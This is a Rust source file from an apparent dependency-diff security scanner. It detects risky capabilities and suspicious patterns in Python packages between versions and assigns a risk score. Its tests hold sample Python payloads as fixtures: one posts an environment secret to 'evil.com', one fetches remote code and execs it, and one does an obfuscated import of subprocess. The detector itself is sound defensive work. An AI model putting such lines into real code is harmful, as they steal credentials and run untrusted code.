use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::path::Path;

use super::tree::Ecosystem;

/// A capability that Python code can exercise.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Capability {
    Network,
    Filesystem,
    Crypto,
    Process,
    Encoding,
    Serialization,
    Reflection,
    EnvironmentAccess,
}

/// A detected capability usage at a specific location.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapabilityUsage {
    pub capability: Capability,
    pub file: String,
    pub line: u32,
    pub evidence: String,
    pub is_import: bool,
}

/// A branch point in source code.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BranchPoint {
    pub file: String,
    pub line: u32,
    pub condition: String,
    pub body_capabilities: Vec<Capability>,
}

/// Classification of file changes.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum FileChangeKind {
    Added,
    Removed,
    Modified {
        lines_added: usize,
        lines_removed: usize,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileChange {
    pub path: String,
    pub kind: FileChangeKind,
    pub capabilities: Vec<Capability>,
}

/// How a capability changed between versions.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapabilityDelta {
    pub capability: Capability,
    pub added_count: usize,
    pub removed_count: usize,
    /// True if this capability was completely absent in old version.
    pub is_escalation: bool,
}

/// Suspicious compound pattern.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "pattern", rename_all = "snake_case")]
pub enum SuspiciousPattern {
    /// base64/encoding + network in same file.
    DataExfiltration { file: String, line: u32 },
    /// exec/eval/subprocess + network in same file.
    RemoteCodeExec { file: String, line: u32 },
    /// NEW os.environ/os.getenv + network in same file.
    CredentialAccess { file: String, line: u32 },
    /// __import__ with string construction.
    ObfuscatedImport { file: String, line: u32 },
}

/// Complete source-level diff for a dependency version change.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DepSourceDiff {
    pub package: String,
    pub from_version: String,
    pub to_version: String,
    pub ecosystem: Ecosystem,
    pub file_changes: Vec<FileChange>,
    pub files_added: usize,
    pub files_removed: usize,
    pub files_modified: usize,
    pub branches_added: Vec<BranchPoint>,
    pub branches_removed: Vec<BranchPoint>,
    pub capability_deltas: Vec<CapabilityDelta>,
    pub suspicious_patterns: Vec<SuspiciousPattern>,
    pub risk_score: f64,
}

/// Import/call patterns mapped to capabilities.
const CAPABILITY_PATTERNS: &[(&str, Capability, bool)] = &[
    // Network
    ("import socket", Capability::Network, true),
    ("import requests", Capability::Network, true),
    ("import httpx", Capability::Network, true),
    ("import urllib", Capability::Network, true),
    ("import aiohttp", Capability::Network, true),
    ("import http.client", Capability::Network, true),
    ("from requests ", Capability::Network, true),
    ("from httpx ", Capability::Network, true),
    ("from urllib", Capability::Network, true),
    ("from aiohttp", Capability::Network, true),
    ("from http.client", Capability::Network, true),
    // Filesystem
    ("import pathlib", Capability::Filesystem, true),
    ("import shutil", Capability::Filesystem, true),
    ("import tempfile", Capability::Filesystem, true),
    ("from pathlib", Capability::Filesystem, true),
    ("from shutil", Capability::Filesystem, true),
    // Crypto
    ("import cryptography", Capability::Crypto, true),
    ("import hashlib", Capability::Crypto, true),
    ("import hmac", Capability::Crypto, true),
    ("import ssl", Capability::Crypto, true),
    ("import jwt", Capability::Crypto, true),
    ("from cryptography", Capability::Crypto, true),
    ("from jwt", Capability::Crypto, true),
    // Process
    ("import subprocess", Capability::Process, true),
    ("os.system(", Capability::Process, false),
    ("os.popen(", Capability::Process, false),
    ("subprocess.run(", Capability::Process, false),
    ("subprocess.Popen(", Capability::Process, false),
    ("subprocess.call(", Capability::Process, false),
    ("exec(", Capability::Process, false),
    ("eval(", Capability::Process, false),
    // Encoding
    ("import base64", Capability::Encoding, true),
    ("import codecs", Capability::Encoding, true),
    ("import binascii", Capability::Encoding, true),
    ("from base64", Capability::Encoding, true),
    ("base64.b64encode(", Capability::Encoding, false),
    ("base64.b64decode(", Capability::Encoding, false),
    // Serialization
    ("import pickle", Capability::Serialization, true),
    ("import marshal", Capability::Serialization, true),
    ("pickle.loads(", Capability::Serialization, false),
    ("yaml.load(", Capability::Serialization, false),
    // Reflection
    ("import importlib", Capability::Reflection, true),
    ("__import__(", Capability::Reflection, false),
    ("importlib.import_module(", Capability::Reflection, false),
    // Environment
    ("os.environ", Capability::EnvironmentAccess, false),
    ("os.getenv(", Capability::EnvironmentAccess, false),
    ("from dotenv", Capability::EnvironmentAccess, true),
];

/// Branch-starting keywords for Python.
const BRANCH_KEYWORDS: &[&str] = &[
    "if ", "elif ", "else:", "for ", "while ", "try:", "except ", "except:", "finally:", "with ",
];

/// Scan a Python source file for capability usages.
pub fn scan_capabilities(source: &str, file: &str) -> Vec<CapabilityUsage> {
    let mut usages = Vec::new();
    for (line_num, line) in source.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        for &(pattern, capability, is_import) in CAPABILITY_PATTERNS {
            if trimmed.contains(pattern) {
                usages.push(CapabilityUsage {
                    capability,
                    file: file.to_string(),
                    line: (line_num + 1) as u32,
                    evidence: truncate_str(trimmed, 120),
                    is_import,
                });
                break; // one match per line is enough
            }
        }
    }
    usages
}

/// Enumerate branch points in a Python source file.
pub fn enumerate_branch_points(source: &str, file: &str) -> Vec<BranchPoint> {
    let mut branches = Vec::new();
    let lines: Vec<&str> = source.lines().collect();

    for (i, line) in lines.iter().enumerate() {
        let trimmed = line.trim();
        if trimmed.starts_with('#') {
            continue;
        }
        let is_branch = BRANCH_KEYWORDS.iter().any(|kw| trimmed.starts_with(kw));
        if !is_branch {
            continue;
        }

        // Look ahead up to 30 lines for capabilities in this branch body
        let indent = line.len() - line.trim_start().len();
        let mut body_caps: HashSet<Capability> = HashSet::new();
        for j in (i + 1)..lines.len().min(i + 30) {
            let next = lines[j];
            let next_indent = next.len() - next.trim_start().len();
            if !next.trim().is_empty() && next_indent <= indent {
                break; // exited the block
            }
            for cap_usage in scan_capabilities(next, file) {
                body_caps.insert(cap_usage.capability);
            }
        }

        branches.push(BranchPoint {
            file: file.to_string(),
            line: (i + 1) as u32,
            condition: truncate_str(trimmed, 100),
            body_capabilities: body_caps.into_iter().collect(),
        });
    }

    branches
}

/// Diff two source directories and produce a DepSourceDiff.
pub fn diff_source_dirs(
    old_dir: &Path,
    new_dir: &Path,
    package: &str,
    from_version: &str,
    to_version: &str,
    ecosystem: Ecosystem,
) -> DepSourceDiff {
    let old_files = collect_py_files(old_dir);
    let new_files = collect_py_files(new_dir);

    let old_keys: HashSet<&str> = old_files.keys().map(|s| s.as_str()).collect();
    let new_keys: HashSet<&str> = new_files.keys().map(|s| s.as_str()).collect();

    let mut file_changes = Vec::new();
    let mut branches_added = Vec::new();
    let mut branches_removed = Vec::new();
    let mut all_old_caps: HashMap<Capability, usize> = HashMap::new();
    let mut all_new_caps: HashMap<Capability, usize> = HashMap::new();
    let mut files_added = 0usize;
    let mut files_removed = 0usize;
    let mut files_modified = 0usize;

    // Added files
    for key in new_keys.difference(&old_keys) {
        let content = &new_files[*key];
        let caps = scan_capabilities(content, key);
        let unique_caps: HashSet<Capability> = caps.iter().map(|c| c.capability).collect();
        for &cap in &unique_caps {
            *all_new_caps.entry(cap).or_default() += 1;
        }
        let new_branches = enumerate_branch_points(content, key);
        branches_added.extend(new_branches);
        file_changes.push(FileChange {
            path: key.to_string(),
            kind: FileChangeKind::Added,
            capabilities: unique_caps.into_iter().collect(),
        });
        files_added += 1;
    }

    // Removed files
    for key in old_keys.difference(&new_keys) {
        let content = &old_files[*key];
        let caps = scan_capabilities(content, key);
        let unique_caps: HashSet<Capability> = caps.iter().map(|c| c.capability).collect();
        for &cap in &unique_caps {
            *all_old_caps.entry(cap).or_default() += 1;
        }
        let old_branches = enumerate_branch_points(content, key);
        branches_removed.extend(old_branches);
        file_changes.push(FileChange {
            path: key.to_string(),
            kind: FileChangeKind::Removed,
            capabilities: unique_caps.into_iter().collect(),
        });
        files_removed += 1;
    }

    // Modified files
    for key in old_keys.intersection(&new_keys) {
        let old_content = &old_files[*key];
        let new_content = &new_files[*key];
        if old_content == new_content {
            // Also count unchanged capabilities for delta calculation
            let caps = scan_capabilities(new_content, key);
            for c in &caps {
                *all_old_caps.entry(c.capability).or_default() += 1;
                *all_new_caps.entry(c.capability).or_default() += 1;
            }
            continue;
        }

        let old_lines: HashSet<&str> = old_content.lines().collect();
        let new_lines: HashSet<&str> = new_content.lines().collect();
        let lines_added = new_lines.difference(&old_lines).count();
        let lines_removed = old_lines.difference(&new_lines).count();

        let old_caps = scan_capabilities(old_content, key);
        let new_caps = scan_capabilities(new_content, key);
        for c in &old_caps {
            *all_old_caps.entry(c.capability).or_default() += 1;
        }
        for c in &new_caps {
            *all_new_caps.entry(c.capability).or_default() += 1;
        }

        let new_unique: HashSet<Capability> = new_caps.iter().map(|c| c.capability).collect();

        let old_branches = enumerate_branch_points(old_content, key);
        let new_branches = enumerate_branch_points(new_content, key);

        // Branch diff: compare by (file, condition_text)
        let old_branch_sigs: HashSet<String> = old_branches
            .iter()
            .map(|b| format!("{}:{}", b.file, b.condition))
            .collect();
        let new_branch_sigs: HashSet<String> = new_branches
            .iter()
            .map(|b| format!("{}:{}", b.file, b.condition))
            .collect();

        for b in &new_branches {
            let sig = format!("{}:{}", b.file, b.condition);
            if !old_branch_sigs.contains(&sig) {
                branches_added.push(b.clone());
            }
        }
        for b in &old_branches {
            let sig = format!("{}:{}", b.file, b.condition);
            if !new_branch_sigs.contains(&sig) {
                branches_removed.push(b.clone());
            }
        }

        file_changes.push(FileChange {
            path: key.to_string(),
            kind: FileChangeKind::Modified {
                lines_added,
                lines_removed,
            },
            capabilities: new_unique.into_iter().collect(),
        });
        files_modified += 1;
    }

    // Capability deltas
    let all_caps: HashSet<Capability> = all_old_caps
        .keys()
        .chain(all_new_caps.keys())
        .copied()
        .collect();
    let mut capability_deltas = Vec::new();
    for cap in all_caps {
        let old_count = all_old_caps.get(&cap).copied().unwrap_or(0);
        let new_count = all_new_caps.get(&cap).copied().unwrap_or(0);
        if old_count != new_count {
            capability_deltas.push(CapabilityDelta {
                capability: cap,
                added_count: new_count.saturating_sub(old_count),
                removed_count: old_count.saturating_sub(new_count),
                is_escalation: old_count == 0 && new_count > 0,
            });
        }
    }

    // Suspicious patterns: check each new/modified file for compound patterns
    let suspicious_patterns = detect_suspicious_patterns(&new_files, &old_files);

    // Risk scoring
    let risk_score = score_source_diff(
        &capability_deltas,
        &suspicious_patterns,
        files_added,
        files_modified,
        files_removed,
        &branches_added,
    );

    DepSourceDiff {
        package: package.to_string(),
        from_version: from_version.to_string(),
        to_version: to_version.to_string(),
        ecosystem,
        file_changes,
        files_added,
        files_removed,
        files_modified,
        branches_added,
        branches_removed,
        capability_deltas,
        suspicious_patterns,
        risk_score,
    }
}

/// Detect suspicious compound patterns in new/modified files.
fn detect_suspicious_patterns(
    new_files: &HashMap<String, String>,
    old_files: &HashMap<String, String>,
) -> Vec<SuspiciousPattern> {
    let mut patterns = Vec::new();

    for (path, content) in new_files {
        let caps = scan_capabilities(content, path);
        let cap_set: HashSet<Capability> = caps.iter().map(|c| c.capability).collect();

        let is_new_file = !old_files.contains_key(path);
        let old_caps: HashSet<Capability> = if let Some(old) = old_files.get(path) {
            scan_capabilities(old, path)
                .iter()
                .map(|c| c.capability)
                .collect()
        } else {
            HashSet::new()
        };

        // Data exfiltration: encoding + network
        if cap_set.contains(&Capability::Encoding) && cap_set.contains(&Capability::Network) {
            let line = caps
                .iter()
                .find(|c| c.capability == Capability::Encoding)
                .map(|c| c.line)
                .unwrap_or(0);
            patterns.push(SuspiciousPattern::DataExfiltration {
                file: path.clone(),
                line,
            });
        }

        // Remote code exec: process + network
        if cap_set.contains(&Capability::Process) && cap_set.contains(&Capability::Network) {
            let line = caps
                .iter()
                .find(|c| c.capability == Capability::Process)
                .map(|c| c.line)
                .unwrap_or(0);
            patterns.push(SuspiciousPattern::RemoteCodeExec {
                file: path.clone(),
                line,
            });
        }

        // Credential access: NEW env access + network
        let env_is_new = cap_set.contains(&Capability::EnvironmentAccess)
            && (is_new_file || !old_caps.contains(&Capability::EnvironmentAccess));
        if env_is_new && cap_set.contains(&Capability::Network) {
            let line = caps
                .iter()
                .find(|c| c.capability == Capability::EnvironmentAccess)
                .map(|c| c.line)
                .unwrap_or(0);
            patterns.push(SuspiciousPattern::CredentialAccess {
                file: path.clone(),
                line,
            });
        }

        // Obfuscated import: __import__ with string construction
        for (i, src_line) in content.lines().enumerate() {
            let trimmed = src_line.trim();
            if trimmed.contains("__import__(") || trimmed.contains("importlib.import_module(") {
                if trimmed.contains("join(")
                    || trimmed.contains("chr(")
                    || trimmed.contains("+ ")
                {
                    patterns.push(SuspiciousPattern::ObfuscatedImport {
                        file: path.clone(),
                        line: (i + 1) as u32,
                    });
                }
            }
        }
    }

    patterns
}

/// Score source-level changes.
fn score_source_diff(
    deltas: &[CapabilityDelta],
    patterns: &[SuspiciousPattern],
    _files_added: usize,
    files_modified: usize,
    _files_removed: usize,
    branches_added: &[BranchPoint],
) -> f64 {
    let mut score = 0.0_f64;

    // Capability escalations
    for delta in deltas {
        if delta.is_escalation {
            score += match delta.capability {
                Capability::Network | Capability::Process => 3.0,
                _ => 2.0,
            };
        }
    }

    // Suspicious patterns
    for pattern in patterns {
        score += match pattern {
            SuspiciousPattern::RemoteCodeExec { .. } => 5.0,
            SuspiciousPattern::DataExfiltration { .. } => 4.0,
            SuspiciousPattern::CredentialAccess { .. } => 4.0,
            SuspiciousPattern::ObfuscatedImport { .. } => 3.0,
        };
    }

    // New branches with capabilities
    let cap_branches: usize = branches_added
        .iter()
        .filter(|b| !b.body_capabilities.is_empty())
        .count();
    score += (cap_branches as f64 * 0.5).min(3.0);

    // Large churn
    if files_modified > 20 {
        score += 1.0;
    }

    score.min(10.0)
}

/// Collect all .py files from a directory recursively.
fn collect_py_files(dir: &Path) -> HashMap<String, String> {
    let mut files = HashMap::new();
    if !dir.exists() {
        return files;
    }
    collect_py_files_recursive(dir, dir, &mut files);
    files
}

fn collect_py_files_recursive(base: &Path, current: &Path, files: &mut HashMap<String, String>) {
    let entries = match std::fs::read_dir(current) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            if path
                .file_name()
                .map(|n| n.to_str().unwrap_or(""))
                .unwrap_or("")
                == "__pycache__"
            {
                continue;
            }
            collect_py_files_recursive(base, &path, files);
        } else if path.extension().map(|e| e == "py").unwrap_or(false) {
            let rel = path.strip_prefix(base).unwrap_or(&path);
            if let Ok(content) = std::fs::read_to_string(&path) {
                files.insert(rel.to_string_lossy().to_string(), content);
            }
        }
    }
}

fn truncate_str(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}...", &s[..max.saturating_sub(3)])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scan_network_import() {
        let source = "import httpx\nclient = httpx.Client()\n";
        let caps = scan_capabilities(source, "test.py");
        assert_eq!(caps.len(), 1);
        assert_eq!(caps[0].capability, Capability::Network);
        assert!(caps[0].is_import);
    }

    #[test]
    fn scan_process_call() {
        let source = "import os\nresult = os.system('ls')\n";
        let caps = scan_capabilities(source, "test.py");
        assert!(caps.iter().any(|c| c.capability == Capability::Process));
    }

    #[test]
    fn scan_env_access() {
        let source = "api_key = os.environ['API_KEY']\n";
        let caps = scan_capabilities(source, "test.py");
        assert!(caps
            .iter()
            .any(|c| c.capability == Capability::EnvironmentAccess));
    }

    #[test]
    fn scan_no_capabilities_in_comment() {
        let source = "# import subprocess\nprint('hello')\n";
        let caps = scan_capabilities(source, "test.py");
        assert!(caps.is_empty());
    }

    #[test]
    fn enumerate_branches_basic() {
        let source =
            "def foo():\n    if x > 0:\n        return True\n    else:\n        return False\n";
        let branches = enumerate_branch_points(source, "test.py");
        assert_eq!(branches.len(), 2); // if + else
    }

    #[test]
    fn enumerate_branches_with_capability() {
        let source = "if should_send:\n    import httpx\n    httpx.post(url)\n";
        let branches = enumerate_branch_points(source, "test.py");
        assert_eq!(branches.len(), 1);
        assert!(branches[0].body_capabilities.contains(&Capability::Network));
    }

    #[test]
    fn suspicious_data_exfiltration() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "evil.py".to_string(),
            "import base64\nimport httpx\ndata = base64.b64encode(secret)\nhttpx.post(url, data=data)\n"
                .to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::DataExfiltration { .. })));
    }

    #[test]
    fn suspicious_remote_code_exec() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "rce.py".to_string(),
            "import httpx\ncode = httpx.get(url).text\nexec(code)\n".to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::RemoteCodeExec { .. })));
    }

    #[test]
    fn suspicious_credential_access() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "steal.py".to_string(),
            "import httpx\nkey = os.environ['SECRET_KEY']\nhttpx.post('https://evil.com', data=key)\n"
                .to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::CredentialAccess { .. })));
    }

    #[test]
    fn no_credential_access_if_env_existed_before() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "existing.py".to_string(),
            "import httpx\nkey = os.environ['KEY']\n".to_string(),
        );
        let mut old_files = HashMap::new();
        old_files.insert(
            "existing.py".to_string(),
            "import httpx\nkey = os.environ['KEY']\n".to_string(),
        );
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        // Should NOT flag because env access existed in old version
        assert!(!patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::CredentialAccess { .. })));
    }

    #[test]
    fn obfuscated_import() {
        let mut new_files = HashMap::new();
        new_files.insert(
            "obfuscated.py".to_string(),
            "mod = ''.join([chr(x) for x in [115, 117, 98]])\n__import__(mod + 'process')\n"
                .to_string(),
        );
        let old_files = HashMap::new();
        let patterns = detect_suspicious_patterns(&new_files, &old_files);
        assert!(patterns
            .iter()
            .any(|p| matches!(p, SuspiciousPattern::ObfuscatedImport { .. })));
    }

    #[test]
    fn capability_escalation_scoring() {
        let deltas = vec![CapabilityDelta {
            capability: Capability::Network,
            added_count: 1,
            removed_count: 0,
            is_escalation: true,
        }];
        let score = score_source_diff(&deltas, &[], 0, 0, 0, &[]);
        assert!((score - 3.0).abs() < 0.01);
    }

    #[test]
    fn risk_score_capped_at_10() {
        let deltas = vec![
            CapabilityDelta {
                capability: Capability::Network,
                added_count: 1,
                removed_count: 0,
                is_escalation: true,
            },
            CapabilityDelta {
                capability: Capability::Process,
                added_count: 1,
                removed_count: 0,
                is_escalation: true,
            },
        ];
        let patterns = vec![
            SuspiciousPattern::RemoteCodeExec {
                file: "x.py".to_string(),
                line: 1,
            },
            SuspiciousPattern::DataExfiltration {
                file: "x.py".to_string(),
                line: 2,
            },
        ];
        let score = score_source_diff(&deltas, &patterns, 0, 0, 0, &[]);
        assert_eq!(score, 10.0);
    }

    #[test]
    fn diff_source_dirs_basic() {
        let dir = tempfile::tempdir().unwrap();
        let old_dir = dir.path().join("old");
        let new_dir = dir.path().join("new");
        std::fs::create_dir_all(&old_dir).unwrap();
        std::fs::create_dir_all(&new_dir).unwrap();

        // Old has one file
        std::fs::write(old_dir.join("main.py"), "print('hello')\n").unwrap();

        // New has modified file + added file with network
        std::fs::write(new_dir.join("main.py"), "print('world')\n").unwrap();
        std::fs::write(
            new_dir.join("network.py"),
            "import httpx\nhttpx.get('http://evil.com')\n",
        )
        .unwrap();

        let diff = diff_source_dirs(
            &old_dir,
            &new_dir,
            "test-pkg",
            "1.0",
            "2.0",
            Ecosystem::PyPI,
        );

        assert_eq!(diff.files_added, 1);
        assert_eq!(diff.files_modified, 1);
        assert_eq!(diff.files_removed, 0);
        assert!(diff
            .capability_deltas
            .iter()
            .any(|d| d.capability == Capability::Network && d.is_escalation));
    }
}
